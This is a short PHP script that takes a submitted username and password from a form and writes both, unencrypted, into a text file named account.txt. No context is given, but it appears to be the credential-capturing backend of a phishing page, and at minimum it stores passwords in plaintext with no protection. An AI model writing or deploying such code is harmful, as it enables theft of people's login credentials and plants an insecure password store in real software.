
<?php
$user = $_POST['user'];
$pass = $_POST['pass'];

$myfile = fopen("account.txt", "w") or die("Unable to open file!");

fwrite($myfile, $user);
$txt = "\n" . $pass;
fwrite($myfile, $txt);
fclose($myfile);
?>